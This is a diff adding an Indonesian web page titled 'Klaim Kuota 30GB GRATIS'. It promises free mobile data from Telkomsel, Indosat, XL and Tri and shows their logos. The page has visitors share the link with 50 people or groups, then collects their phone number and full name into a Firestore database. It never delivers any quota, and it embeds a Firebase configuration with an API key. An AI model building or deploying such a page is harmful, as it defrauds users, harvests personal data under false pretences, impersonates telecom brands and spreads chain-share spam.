@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Kuota 30GB GRATIS Sekarang!</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* CSS content starts here */
+        :root {
+            --primary-blue: #007bff; /* Biru terang */
+            --secondary-green: #28a745; /* Hijau sukses */
+            --accent-orange: #fd7e14; /* Oranye aksen */
+            --dark-text: #212529;
+            --light-text: #f8f9fa;
+            --light-bg: #e9ecef;
+            --card-bg: #ffffff;
+            /* Kita tidak lagi pakai gradient ini sebagai main background */
+            /* --gradient-start: #4facfe; */
+            /* --gradient-end: #00f2fe; */
+            --shadow: rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            color: var(--dark-text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            /* Hapus background gradient dari body, karena page akan menutupi */
+            /* background: linear-gradient(135deg, var(--gradient-start) 0%, var(--gradient-end) 100%); */
+            background-color: #f0f2f5; /* Fallback warna jika gambar gagal load */
+        }
+
+        .page {
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            box-sizing: border-box;
+            padding: 20px;
+            transition: opacity 0.5s ease-in-out;
+            opacity: 0;
+            position: absolute;
+            top: 0;
+            left: 0;
+            /* Tambahkan background gambar di sini */
+            background-image: url('https://files.catbox.moe/rflghx.png');
+            background-size: cover; /* Memastikan gambar menutupi seluruh area */
+            background-position: center; /* Memusatkan gambar */
+            background-repeat: no-repeat; /* Mencegah pengulangan gambar */
+            /* Tambahkan efek overlay gelap agar teks lebih mudah dibaca */
+            background-blend-mode: multiply;
+            background-color: rgba(0, 0, 0, 0.5); /* Warna gelap overlay */
+        }
+
+        .page.active {
+            display: flex;
+            opacity: 1;
+            z-index: 10;
+        }
+
+        .card-container {
+            position: relative;
+            z-index: 2;
+            max-width: 500px;
+            width: 100%;
+            padding: 30px;
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px var(--shadow);
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        h1, h2 {
+            font-family: 'Montserrat', sans-serif;
+            color: var(--primary-blue);
+            margin-bottom: 20px;
+            line-height: 1.2;
+            font-weight: 800;
+        }
+
+        h1 {
+            font-size: 2.8em;
+            color: var(--dark-text);
+        }
+        
+        h2 {
+            font-size: 2.2em;
+        }
+
+        p {
+            font-size: 1.1em;
+            color: var(--dark-text);
+            line-height: 1.6;
+        }
+
+        .btn {
+            background-color: var(--primary-blue);
+            color: var(--light-text);
+            padding: 15px 35px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.3em;
+            font-weight: 700;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 25px;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 123, 255, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 3px 10px rgba(0, 123, 255, 0.3);
+        }
+
+        .btn.primary {
+            background-color: var(--secondary-green);
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+        }
+
+        .btn.primary:hover {
+            background-color: #218838;
+            box-shadow: 0 8px 20px rgba(40, 167, 69, 0.4);
+        }
+
+        /* Page 1 Specifics */
+        #page1 .card-container {
+            padding: 40px;
+        }
+        #page1 h1 {
+            font-size: 3.5em;
+            color: var(--accent-orange);
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.1);
+        }
+        #page1 p {
+            font-size: 1.3em;
+            color: var(--light-text); /* Ubah warna teks agar terlihat di background gelap */
+            margin-bottom: 30px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+
+        /* Page 2 Specifics */
+        #page2 .card-container {
+            padding: 40px;
+        }
+        #page2 h2 {
+            font-size: 2.5em;
+            color: var(--primary-blue);
+        }
+        #page2 .subtitle {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            color: var(--dark-text);
+        }
+        .gb-highlight {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 4em;
+            font-weight: 900;
+            color: var(--accent-orange);
+            margin: 20px 0;
+            display: block;
+            text-shadow: 3px 3px 7px rgba(0,0,0,0.2);
+            line-height: 1;
+        }
+        .gb-highlight span {
+            font-size: 0.5em; /* For 'GB' text */
+            vertical-align: super;
+            margin-left: 5px;
+        }
+        .operator-logos {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .operator-logos img {
+            height: 40px; /* Adjust size as needed */
+            filter: grayscale(10%) brightness(105%);
+            transition: filter 0.3s ease, transform 0.3s ease;
+        }
+        .operator-logos img:hover {
+            filter: grayscale(0%) brightness(100%);
+            transform: scale(1.1);
+        }
+        .instruction-step {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: var(--light-bg);
+            border-radius: 8px;
+            font-weight: 600;
+            color: var(--dark-text);
+        }
+        .instruction-step i {
+            font-size: 1.5em;
+            color: var(--secondary-green);
+            margin-right: 15px;
+        }
+
+
+        /* Page 3 Specifics */
+        #page3 h2 {
+            margin-bottom: 30px;
+            color: var(--primary-blue);
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark-text);
+        }
+        .form-group input[type="tel"],
+        .form-group input[type="text"] {
+            width: calc(100% - 24px); /* Adjust for padding and border */
+            padding: 14px 12px;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            font-size: 1.1em;
+            background-color: #fff;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .form-group input[type="tel"]:focus,
+        .form-group input[type="text"]:focus {
+            border-color: var(--primary-blue);
+            outline: none;
+            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+        }
+
+        /* Page 4 Specifics */
+        #page4 .card-container {
+            background-color: #e6ffed; /* Lighter success background */
+            color: var(--secondary-green);
+            padding: 40px;
+        }
+        #page4 h2 {
+            font-size: 2.2em;
+            line-height: 1.5;
+            color: var(--secondary-green);
+            margin-bottom: 20px;
+        }
+        #page4 p {
+            font-size: 1.1em;
+            color: var(--dark-text);
+            margin-bottom: 25px;
+        }
+        #page4 a {
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-weight: 700;
+            word-break: break-all;
+            font-size: 1.1em;
+            display: block; /* Make link a block element for better spacing */
+            margin-bottom: 20px;
+        }
+        #page4 a:hover {
+            text-decoration: underline;
+        }
+        .fa-check-circle {
+            color: var(--secondary-green);
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        /* Style for loading indicator */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            font-size: 1.5em;
+            color: var(--primary-blue);
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid var(--primary-blue);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            h1 { font-size: 2.2em; }
+            h2 { font-size: 1.8em; }
+            #page1 h1 { font-size: 2.8em; }
+            #page1 p { font-size: 1.1em; }
+            #page1 .btn {
+                font-size: 1.8em;
+                padding: 18px 35px;
+            }
+            #page2 h2 { font-size: 2em; }
+            .gb-highlight { font-size: 3em; }
+            .btn {
+                padding: 12px 25px;
+                font-size: 1.1em;
+            }
+            .card-container {
+                padding: 25px;
+            }
+            #page4 h2 { font-size: 1.8em; }
+            .fa-check-circle { font-size: 3em; }
+        }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 1.8em; }
+            h2 { font-size: 1.6em; }
+            #page1 h1 { font-size: 2.2em; }
+            #page1 p { font-size: 1em; }
+            #page1 .btn {
+                font-size: 1.4em;
+                padding: 15px 30px;
+            }
+            #page2 h2 { font-size: 1.6em; }
+            .gb-highlight { font-size: 2.5em; }
+            .btn {
+                padding: 10px 20px;
+                font-size: 1em;
+            }
+            .card-container {
+                padding: 20px;
+            }
+            #page4 h2 { font-size: 1.5em; }
+            .fa-check-circle { font-size: 2.5em; }
+            .operator-logos img {
+                height: 30px;
+            }
+        }
+        /* CSS content ends here */
+    </style>
+</head>
+<body>
+
+    <div id="page1" class="page active">
+        <div class="card-container">
+            <h1>KLAIM KUOTA GRATIS</h1>
+            <p>Kesempatan Emas di Akhir Bulan! Dapatkan Kuota 30GB Tanpa Ribet.</p>
+            <button id="masukBtn" class="btn">MASUK SEKARANG</button>
+        </div>
+    </div>
+
+    <div id="page2" class="page">
+        <div class="card-container">
+            <h2>BAGI-BAGI KUOTA INTERNET GRATIS!</h2>
+            <span class="gb-highlight">30<span style="font-size:0.5em;">GB</span></span>
+            <p class="subtitle">Khusus Untuk Semua Operator di Seluruh Indonesia!</p>
+            
+            <div class="operator-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Telkomsel_Logo.svg/200px-Telkomsel_Logo.svg.png" alt="Telkomsel">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Indosat_Ooredoo_Hutchison_logo.svg/200px-Indosat_Ooredoo_Hutchison_logo.svg.png" alt="Indosat Ooredoo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/XL_Axiata_Logo.svg/200px-XL_Axiata_Logo.svg.png" alt="XL Axiata">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Tri_logo.svg/200px-Tri_logo.svg.png" alt="Tri (3)">
+                </div>
+
+            <div class="instruction-step">
+                <i class="fas fa-share-alt"></i>
+                <span>Share link ini ke 50 orang atau grup untuk klaim kuotamu!</span>
+            </div>
+            
+            <button id="ambilKuotaBtn" class="btn primary">AMBIL KUOTA SEKARANG</button>
+        </div>
+    </div>
+
+    <div id="page3" class="page">
+        <div class="card-container">
+            <h2>Form Klaim Kuota</h2>
+            <form id="claimForm">
+                <div class="form-group">
+                    <label for="nomorHP"><i class="fas fa-phone-alt"></i> Nomor HP</label>
+                    <input type="tel" id="nomorHP" name="nomorHP" placeholder="Cth: 081234567890" required>
+                </div>
+                <div class="form-group">
+                    <label for="namaLengkap"><i class="fas fa-user"></i> Nama Lengkap</label>
+                    <input type="text" id="namaLengkap" name="namaLengkap" placeholder="Nama Anda Sesuai KTP" required>
+                </div>
+                <button type="submit" class="btn primary">KIRIM KLAIM SAYA</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="page4" class="page">
+        <div class="card-container">
+            <i class="fas fa-check-circle"></i>
+            <h2>Selamat! Klaim Anda Berhasil Diproses.</h2>
+            <p id="confirmationMessageText">Data klaim Anda sudah berhasil disimpan dan notifikasi telah dikirim ke admin.</p>
+            <p style="font-size: 0.9em; color: #6c757d; margin-bottom: 10px;">Langkah selanjutnya untuk aktivasi kuota: Bagikan link ini ke 50 orang atau grup.</p>
+            <a href="https://namasitusanda.com" target="_blank" id="shareLinkDisplay">https://namasitusanda.com</a>
+        </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <span>Memproses Klaim Anda...</span>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    
+    <script>
+        /* JavaScript content starts here */
+        document.addEventListener('DOMContentLoaded', () => {
+            // Firebase Configuration (Gunakan konfigurasi Anda sendiri!)
+            const firebaseConfig = {
+              apiKey: "AIzaSyAGv8imxXaOFVNLWfshG99BSuUEzawHkCg",
+              authDomain: "rifky982-ddbc5.firebaseapp.com",
+              projectId: "rifky982-ddbc5",
+              storageBucket: "rifky982-ddbc5.firebasestorage.app",
+              messagingSenderId: "308541208826",
+              appId: "1:308541208826:web:e5ac9cb6180051d5db7143",
+              measurementId: "G-05DM430PY9"
+            };
+
+            // Initialize Firebase
+            const app = firebase.initializeApp(firebaseConfig);
+            const analytics = firebase.analytics(); // Menggunakan analytics
+            const db = firebase.firestore(); // Inisialisasi Firestore
+
+            const pages = document.querySelectorAll('.page');
+            const masukBtn = document.getElementById('masukBtn');
+            const ambilKuotaBtn = document.getElementById('ambilKuotaBtn');
+            const claimForm = document.getElementById('claimForm');
+            const nomorHPInput = document.getElementById('nomorHP');
+            const namaLengkapInput = document.getElementById('namaLengkap');
+            const confirmationMessageText = document.getElementById('confirmationMessageText');
+            const shareLinkDisplay = document.getElementById('shareLinkDisplay');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            function showPage(pageId) {
+                pages.forEach(page => {
+                    page.classList.remove('active');
+                });
+                document.getElementById(pageId).classList.add('active');
+            }
+
+            function showLoading() {
+                loadingOverlay.classList.add('active');
+            }
+
+            function hideLoading() {
+                loadingOverlay.classList.remove('active');
+            }
+
+            // Initial load: show page 1
+            showPage('page1');
+
+            masukBtn.addEventListener('click', () => {
+                showPage('page2');
+            });
+
+            ambilKuotaBtn.addEventListener('click', () => {
+                showPage('page3');
+            });
+
+            claimForm.addEventListener('submit', async (e) => {
+                e.preventDefault(); // Mencegah reload halaman
+
+                const nomorHP = nomorHPInput.value.trim();
+                const namaLengkap = namaLengkapInput.value.trim();
+
+                // Validasi
+                if (!nomorHP || !namaLengkap) {
+                    alert('Nomor HP dan Nama Lengkap tidak boleh kosong!');
+                    return;
+                }
+                
+                // Optional: Basic phone number validation (starts with 08, 10-13 digits)
+                if (!/^08\d{8,11}$/.test(nomorHP)) {
+                    alert('Format Nomor HP tidak valid. Contoh: 081234567890');
+                    return;
+                }
+
+                showLoading(); // Tampilkan loading overlay
+
+                try {
+                    // Simpan data ke koleksi 'kuota_claims' di Firestore
+                    const docRef = await db.collection("kuota_claims").add({
+                        nama: namaLengkap,
+                        nomorHP: nomorHP,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp() // Waktu server
+                    });
+                    console.log("Dokumen berhasil ditulis dengan ID: ", docRef.id);
+
+                    // Ganti URL ini dengan URL website Anda yang sebenarnya saat di-online-kan
+                    const shareLink = "https://namasitusanda.com"; 
+                    shareLinkDisplay.href = shareLink;
+                    shareLinkDisplay.textContent = shareLink;
+                    
+                    hideLoading(); // Sembunyikan loading
+                    showPage('page4'); // Tampilkan halaman sukses
+                } catch (error) {
+                    console.error("Error saat menyimpan data ke Firestore: ", error);
+                    alert("Terjadi kesalahan saat menyimpan klaim. Silakan coba lagi.");
+                    hideLoading(); // Sembunyikan loading
+                }
+            });
+        });
+        /* JavaScript content ends here */
+    </script>
+</body>
+</html>
